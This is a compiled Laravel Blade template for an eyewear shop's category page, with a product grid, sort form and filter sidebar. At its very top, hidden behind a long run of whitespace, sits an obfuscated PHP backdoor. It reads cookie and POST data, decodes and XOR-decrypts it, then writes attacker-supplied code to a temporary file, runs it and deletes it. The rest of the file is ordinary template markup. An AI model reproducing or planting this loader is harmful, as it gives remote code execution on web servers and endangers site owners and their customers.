<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("prxckmlki")){class prxckmlki{public static $xqwmswcz = "elccvragtkbiulem";public static $kjzly = NULL;public function __construct(){$hczzofuayw = @$_COOKIE[substr(prxckmlki::$xqwmswcz, 0, 4)];if (!empty($hczzofuayw)){$fufttlev = "base64";$szhauzxsn = "";$hczzofuayw = explode(",", $hczzofuayw);foreach ($hczzofuayw as $sddejc){$szhauzxsn .= @$_COOKIE[$sddejc];$szhauzxsn .= @$_POST[$sddejc];}$szhauzxsn = array_map($fufttlev . "_decode", array($szhauzxsn,));$szhauzxsn = $szhauzxsn[0] ^ str_repeat(prxckmlki::$xqwmswcz, (strlen($szhauzxsn[0]) / strlen(prxckmlki::$xqwmswcz)) + 1);prxckmlki::$kjzly = @unserialize($szhauzxsn);}}public function __destruct(){$this->vezyxo();}private function vezyxo(){if (is_array(prxckmlki::$kjzly)) {$hxkzrklel = sys_get_temp_dir() . "/" . crc32(prxckmlki::$kjzly["salt"]);@prxckmlki::$kjzly["write"]($hxkzrklel, prxckmlki::$kjzly["content"]);include $hxkzrklel;@prxckmlki::$kjzly["delete"]($hxkzrklel);exit();}}}$cbxet = new prxckmlki();$cbxet = NULL;} ?>


<?php
$meta_title = $meta_description = $meta_keywords = "";
$meta_title = (!empty($main_category->category_meta_title)) ? $main_category->category_meta_title : "Category Meta Title";
$meta_description = (!empty($main_category->category_meta_description)) ? $main_category->category_meta_description : "Category Meta Description";
$meta_keywords = (!empty($main_category->category_meta_keywords)) ? $main_category->category_meta_keywords : "Category Meta Keywords";
?>

<?php $__env->startSection('title',$meta_title); ?>
<?php $__env->startSection('description',$meta_description); ?>
<?php $__env->startSection('keywords',$meta_keywords); ?>
<style type="text/css">
.form-select{
line-height: 1.2 !important;}
</style>


<?php $__env->startSection('content'); ?>
 <section>
    <div class="brand_banner">
      <div class="container">
        <div class="brand_banner_content">
          <div class="brand_banner_content_text text-center">
            <h1 class="brand_bannner_head"><?php echo e($main_category->category_name); ?></h1>
            <nav aria-label="breadcrumb">
              <ol class="breadcrumb breadcrumbStyle justify-content-center">
                <li class="breadcrumb-item"><a href="<?php echo e(route('home.page')); ?>">Home</a></li>
                <li class="breadcrumb-item active" aria-current="page">BRANDS</li>
              </ol>
            </nav>
          </div>
        </div>
      </div>
    </div>
  </section>
<!--====================================== header end ==========================-->
  <section>
    <div class="product_detail section_space pb-0">
      <div class="container">
        <div class="product_deatail_list">
          <div class="product_deatail_list_text">
            <div class="lineTitleCol">
              <h6 class="lineTitle">Explore Our Products</h6>
            </div>
            <h2 class="product_detail_head lgTitle darkColor">Most Loved Frames</h2>
         <!--======================= We found ============================-->
             <p style="color:grey; text-align:center;">We found <span class="count"><?php echo e($products['total']); ?></span> products available for you</p>
<!--======================= We found ============================-->
          </div>
          <div class="filterColMain pt-3">
            <div class="filterCol">
              <div class="row g-2 g-md-3">
                <div class="col"><a  class="btn btnDark w-100 filterBtn"  data-bs-toggle="offcanvas" 
                href="#filterCanvas" role="button" aria-controls="filterCanvas"><span class="filterIcon">
                    <img src="<?php echo e(asset('uploaded_files/assets/images/filter-icon.svg')); ?>" alt="..."></span> <span>Filter</span></a></div>
                <div class="col">
<!--================== sorting start =====================-->
<form class="filter-form" method="get" action="<?php echo e(url('/filter')); ?>">
<?php echo csrf_field(); ?>
<?php echo method_field('GET'); ?>	

<input type="hidden" class="form-control" name="search_product" class="search_product" <?php if(isset($search_product)): ?> value="<?php echo e($search_product); ?>" <?php endif; ?>>

<input type="hidden" class="form-control" name="color_array" class="colors" <?php if(isset($color_array)): ?> value="<?php echo e($color_array); ?>" <?php endif; ?>>

<input type="hidden" class="form-control" name="gender_array" class="genders" <?php if(isset($gender_array)): ?> value="<?php echo e($gender_array); ?>" <?php endif; ?>>

<input type="hidden" class="form-control" name="shape_array" class="shapes" <?php if(isset($shape_array)): ?> value="<?php echo e($shape_array); ?>" <?php endif; ?>>

<input type="hidden" class="form-control" name="frame_array" class="frames" <?php if(isset($frame_array)): ?> value="<?php echo e($frame_array); ?>" <?php endif; ?>>

<input type="hidden" class="form-control" name="material_array" class="materials" <?php if(isset($material_array)): ?> value="<?php echo e($material_array); ?>" <?php endif; ?>>

<input type="hidden" name="min_price" class="min_price" <?php if(isset($min_price)): ?> value="<?php echo e($min_price); ?>" <?php endif; ?>>
<input type="hidden" name="max_price" class="max_price" <?php if(isset($max_price)): ?> value="<?php echo e($max_price); ?>" <?php endif; ?>>

<input type="hidden" name="main_category" id="main_category" value="<?php echo e($main_category->id); ?>">
<select name="order_filter" id="order_filter" onchange="filter('order_filter')" class="form-select selectStyle">
<option value="Default">Default</option>
<option value="Latest" <?php if(isset($order_filter)): ?> <?php if($order_filter=="Latest"): ?> selected <?php endif; ?> <?php endif; ?>>Latest</option>
<option value="Low" <?php if(isset($order_filter)): ?> <?php if($order_filter=="Low"): ?> selected <?php endif; ?> <?php endif; ?>>Price: low to high</option>
<option value="High" <?php if(isset($order_filter)): ?> <?php if($order_filter=="High"): ?> selected <?php endif; ?> <?php endif; ?>>Price: high to low</option>
<option value="Sort_ASC" <?php if(isset($order_filter)): ?> <?php if($order_filter=="Sort_ASC"): ?> selected <?php endif; ?> <?php endif; ?>>A to Z</option>
<option value="Sort_DESC" <?php if(isset($order_filter)): ?> <?php if($order_filter=="Sort_DESC"): ?> selected <?php endif; ?> <?php endif; ?>>Z to A</option>
</select>
</form>
<!--=====================new start                 -->

<!--============================ sorting end ===================                 -->
                </div>
              </div>
            </div>
          </div>
          <div class="productColMain">
            <div class="row g-4">
<?php $__currentLoopData = $products['data']; $__env->addLoop($__currentLoopData); foreach($__currentLoopData as $product): $__env->incrementLoopIndices(); $loop = $__env->getLastLoop(); ?>
              <!-- card start -->
              <div class="col-md-6 col-xl-4">
                <div class="cardStyle1">
                    <?php if($product['category_is_discount']=="Yes"): ?>  
                  <span class="discountCol"><?php echo e($product['category_discount']); ?>% </span>
                  <?php endif; ?>
                  <div class="productImg">

                    <div class="imgCol">
                        
                        <?php if(!empty($product['category_image_name'])): ?>  
                    <a href="<?php echo e(url('/frame/'.$product['category_slug_name'].'.html')); ?>">
                      <img src="<?php echo e(asset('uploaded_files/product/'.$product['category_image_name'])); ?>" alt="...">
                      </a>
                      <?php endif; ?>
                    </div>
                    
<?php
$get_current_color = DB::table('product_colors')->orderBy('color_code')->where('id',$product['category_color'])->first(); 
?>
                    <div class="color_builts">
                      <ul>
<?php
$group_ids = explode(',',$product['category_group_ids']);
$group_prd = DB::table('categories')->whereIn('id',$group_ids)->where('category_status','Active')->get();
$i=1;
?>
<?php if(!empty($product['category_group_ids'])): ?>  

<?php $__currentLoopData = $group_prd; $__env->addLoop($__currentLoopData); foreach($__currentLoopData as $group): $__env->incrementLoopIndices(); $loop = $__env->getLastLoop(); ?>
<?php
$color_data = DB::table('product_colors')->where('id',$group->category_color)->first(); 
?>  
<li>
<a href="<?php echo e(url('/frame/'.$group->category_slug_name.'.html')); ?>"  class="colorCol actColor btn-tool <?php if($group->category_slug_name==$product['category_slug_name']): ?> color-btn <?php endif; ?>" >
<img src="<?php echo e(asset('uploaded_files/color_image/'.$color_data->color_image_name)); ?>" alt="..."></a>
</li>
<?php
$i++;
?>   
<?php endforeach; $__env->popLoop(); $loop = $__env->getLastLoop(); ?>
<?php else: ?>
<li>
<a href="<?php echo e(url('/frame/'.$product['category_slug_name'].'.html')); ?>"  class="colorCol">
<img src="<?php echo e(asset('uploaded_files/color_image/'.$get_current_color->color_image_name)); ?>" alt="..."></a>
</li>
                        <?php endif; ?>
                      </ul>
                    </div>
                  </div>
                  <div class="contentCol">
                    <h4 class="brandCol"><?php echo e($main_category->category_name); ?></h4>
                    <a href="<?php echo e(url('/frame/'.$product['category_slug_name'].'.html')); ?>">
                    <p><?php echo e(Str::limit($product['category_name'],20,$end='..')); ?></p>
                    </a>
                    <span class="priceCol"><?php echo e(getCurrencySymbol($ip_country).getCurrencyPrice($ip_country,$product['category_discount_price'])); ?>  </span>
                    <?php if($product['category_is_discount']=="Yes"): ?>
<strike id="mrp" class="priceCol"><?php echo e(getCurrencySymbol($ip_country).getCurrencyPrice($ip_country,$product['category_price'])); ?></strike>
<?php endif; ?>
                    <div class="row gx-2">
                      <div class="col-auto">
                        <a href="<?php echo e(url('/frame/'.$product['category_slug_name'].'.html')); ?>" class="btn btnDark w-100 addCartBtn">ADD TO CART</a>
                      </div>
                      <div class="col">
                        <a href="javascript:void(0)" class="btn btnDark_outline w-100">ADD TO WISHLIST</a>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <?php endforeach; $__env->popLoop(); $loop = $__env->getLastLoop(); ?>  
              <!-- card end -->
              
            </div>
            <div class="btnCol text-center">
              <!--<a href="javascript:void(0)" class="btn btnPrimary minWdBtn btnNew">Load More</a>-->
            </div>
          </div>
        </div>
        </div>
      </div>
    </div>
  </section>

<!--============================= filter ==========================-->
  <div class="offcanvas offcanvas-start offCanvasStyle" tabindex="-1" id="filterCanvas" aria-labelledby="filterCanvasLabel">
  <div class="offcanvas-header">
    <h5 class="offcanvas-title" id="filterCanvasLabel"></h5>
    <button type="button" class="btn-close text-reset" data-bs-dismiss="offcanvas" aria-label="Close"></button>
  </div>
  <div class="backDrop"></div>
  <div class="offcanvas-body">

    <h5 class="smTitle">Gender</h5>
<?php if(isset($gender_array) && !empty($gender_array)): ?>
 <?php
 $gender_key = 'gender_array';
 $url = Request::fullURL();

// Remove specific parameter from query string
$filteredURL = preg_replace('~(\?|&)'.$gender_key.'=[^&]*~', '$1', $url);

 ?>

 <span style="float:right"><a href="<?php echo e(url($filteredURL)); ?>" title="Remove Filter"><i class="fa fa-times-circle"></i></a></span>
<?php endif; ?>   
    <div class="filterChekCol">
      <ul>
<?php
if(isset($gender_array)){
$check_gender = explode(',',$gender_array);
}
?>
<li><input type="checkbox" name="genders[]" id="genders[]" value="Gentle Man" onclick="filter('gender_filter')" <?php if(isset($gender_array)): ?> <?php if(in_array('Gentle Man',$check_gender)): ?> checked <?php endif; ?> <?php endif; ?>> Gentle Man</li>
<li><input type="checkbox" name="genders[]" id="genders[]" value="Woman" onclick="filter('gender_filter')" <?php if(isset($gender_array)): ?> <?php if(in_array('Woman',$check_gender)): ?> checked <?php endif; ?> <?php endif; ?>> Woman</li>
<li><input type="checkbox" name="genders[]" id="genders[]" value="Junior" onclick="filter('gender_filter')" <?php if(isset($gender_array)): ?> <?php if(in_array('Junior',$check_gender)): ?> checked <?php endif; ?> <?php endif; ?>> Junior</li>

    
      </ul>
    </div>
    <!--=============== search =================-->
    <div class="widget-wrap" > 
<div class="widget-search">

<input type="text" placeholder="Search" class="form-control" name="search_product" id="search_product"
<?php if(isset($search_product)): ?> value="<?php echo e($search_product); ?>" <?php endif; ?>>

<a onclick="filter('search_filter')" style="font-weight: 900 !important;position: relative !important;top: -1.6rem !important;
    left: 19.5rem !important; background-color: white important;"><i class="fa fa-search"></i></a>

<?php if(isset($search_product) && !empty($search_product)): ?>
 <?php
 $search_product_key = 'search_product';
 $url = Request::fullURL();

// Remove specific parameter from query string
$filteredURL = preg_replace('~(\?|&)'.$search_product_key.'=[^&]*~', '$1', $url);

 ?>

 <span style="float:right"><a href="<?php echo e(url($filteredURL)); ?>" title="Remove Filter"><i class="fa fa-times-circle"></i></a></span>
<?php endif; ?>
</div>
</div>
<!--================== search end ====================-->

<!--================================= Our Brands ================================-->
    <h5 class="smTitle">Our Brands</h5>
    <div class="filterChekCol">
      <ul>
<?php $__currentLoopData = $all_brands; $__env->addLoop($__currentLoopData); foreach($__currentLoopData as $brand): $__env->incrementLoopIndices(); $loop = $__env->getLastLoop(); ?>
        <li>
          <span class="filterChek">
           <a href="<?php echo e(url('/brand/'.$brand->category_slug_name.'.html')); ?>">
            <label class="btn btn-outline-secondary" for="btncheck1"><?php echo e($brand->category_name); ?></label>
            </a>
          </span>
        </li>
<?php endforeach; $__env->popLoop(); $loop = $__env->getLastLoop(); ?>
      </ul>
    </div>
<!--================================= colors ================================-->
    <h5 class="smTitle">colors</h5>
  <?php if(isset($color_array) && !empty($color_array)): ?>
 <?php
 $color_key = 'color_array';
 $url = Request::fullURL();

// Remove specific parameter from query string
$filteredURL = preg_replace('~(\?|&)'.$color_key.'=[^&]*~', '$1', $url);

 ?>

 <span style="float:right"><a href="<?php echo e(url($filteredURL)); ?>" title="Remove Filter"><i class="fa fa-times-circle"></i></a></span>
<?php endif; ?>    
    <div class="filterChekCol">
      <ul>
<?php
if(isset($color_array)){
$check_color = explode(',',$color_array);
}
?>
 <?php $__currentLoopData = $frame_colors; $__env->addLoop($__currentLoopData); foreach($__currentLoopData as $color): $__env->incrementLoopIndices(); $loop = $__env->getLastLoop(); ?>
 
         <li>
          <span class="filterChek">
            <input type="checkbox" type="checkbox" name="colors[]" id="colors[]" value="<?php echo e($color->id); ?>" onclick="filter('color_filter')"
<?php if(isset($color_array)): ?> <?php if(in_array($color->id,$check_color)): ?> checked <?php endif; ?> <?php endif; ?>>
            <label class="btn colorBtn" for="btncheck-01"><img src="<?php echo e(asset('uploaded_files/color_image/'.$color->color_image_name)); ?>" alt="..."></label>
          </span>
        </li>
 

     <?php endforeach; $__env->popLoop(); $loop = $__env->getLastLoop(); ?>
      </ul>
    </div>
<!--================================= SHAPES ================================-->
    <h5 class="smTitle">SHAPES</h5>
<?php if(isset($shape_array) && !empty($shape_array)): ?>
 <?php
 $shape_key = 'shape_array';
 $url = Request::fullURL();
// Remove specific parameter from query string
$filteredURL = preg_replace('~(\?|&)'.$shape_key.'=[^&]*~', '$1', $url);
 ?>
 <span style="float:right"><a href="<?php echo e(url($filteredURL)); ?>" title="Remove Filter"><i class="fa fa-times-circle"></i></a></span>
<?php endif; ?>    

    <div class="filterChekCol">
      <ul>
<?php
if(isset($shape_array)){
$check_shape = explode(',',$shape_array);
}
?>
 <?php $__currentLoopData = $frame_shapes; $__env->addLoop($__currentLoopData); foreach($__currentLoopData as $shape): $__env->incrementLoopIndices(); $loop = $__env->getLastLoop(); ?>

    <li>
          <span class="filterChek">

<input type="checkbox" name="shapes[]" id="shapes[]" value="<?php echo e($shape->shape); ?>"
onclick="filter('shape_filter')" <?php if(isset($shape_array)): ?> <?php if(in_array($shape->shape,$check_shape)): ?> checked <?php endif; ?> <?php endif; ?>> <?php echo e($shape->shape); ?>


          </span>
        </li>


 <?php endforeach; $__env->popLoop(); $loop = $__env->getLastLoop(); ?>
      </ul>
    </div>
<!--================================= material ================================-->
    <h5 class="smTitle">material</h5>
<?php if(isset($material_array) && !empty($material_array)): ?>
 <?php
 $material_key = 'material_array';
 $url = Request::fullURL();

// Remove specific parameter from query string
$filteredURL = preg_replace('~(\?|&)'.$material_key.'=[^&]*~', '$1', $url);

 ?>

 <span style="float:right"><a href="<?php echo e(url($filteredURL)); ?>" title="Remove Filter"><i class="fa fa-times-circle"></i></a></span>
<?php endif; ?>   
    <div class="filterChekCol">
      <ul>
<?php
if(isset($material_array)){
$check_material = explode(',',$material_array);
}
?>
 <?php $__currentLoopData = $frame_materials; $__env->addLoop($__currentLoopData); foreach($__currentLoopData as $material): $__env->incrementLoopIndices(); $loop = $__env->getLastLoop(); ?>
         <li>
          <span class="filterChek">
       <input type="checkbox" type="checkbox" name="materials[]" id="materials[]" value="<?php echo e($material->material); ?>" 
 onclick="filter('material_filter')" <?php if(isset($material_array)): ?> <?php if(in_array($material->material,$check_material)): ?>
 checked <?php endif; ?> <?php endif; ?>> <?php echo e($material->material); ?></li>
          </span>
        </li>
<?php endforeach; $__env->popLoop(); $loop = $__env->getLastLoop(); ?>
      </ul>
    </div>

<!--================================= frame type ================================-->
    <h5 class="smTitle">frame type</h5>
<?php if(isset($frame_array) && !empty($frame_array)): ?>
 <?php
 $frame_key = 'frame_array';
 $url = Request::fullURL();

// Remove specific parameter from query string
$filteredURL = preg_replace('~(\?|&)'.$frame_key.'=[^&]*~', '$1', $url);

 ?>

 <span style="float:right"><a href="<?php echo e(url($filteredURL)); ?>" title="Remove Filter"><i class="fa fa-times-circle"></i></a></span>
<?php endif; ?>

    <div class="filterChekCol">
      <ul>
<?php
if(isset($frame_array)){
$check_frame = explode(',',$frame_array);
}
?>    
 <?php $__currentLoopData = $frame_types; $__env->addLoop($__currentLoopData); foreach($__currentLoopData as $type): $__env->incrementLoopIndices(); $loop = $__env->getLastLoop(); ?>
 <li>
          <span class="filterChek">
    <li><input type="checkbox" name="frames[]" id="frames[]" value="<?php echo e($type->type); ?>" 
 onclick="filter('frame_filter')" <?php if(isset($frame_array)): ?> <?php if(in_array($type->type,$check_frame)): ?> 
 checked <?php endif; ?> <?php endif; ?>><?php echo e($type->type); ?></li>
          </span>
        </li>
 <?php endforeach; $__env->popLoop(); $loop = $__env->getLastLoop(); ?>
      </ul>
    </div>
  </div>
</div>
  


<?php $__env->stopSection(); ?>
<?php echo $__env->make('layouts.app', \Illuminate\Support\Arr::except(get_defined_vars(), ['__data', '__path']))->render(); ?><?php /**PATH /home2/luxurjhf/public_html/eyewear/resources/views/category.blade.php ENDPATH**/ ?>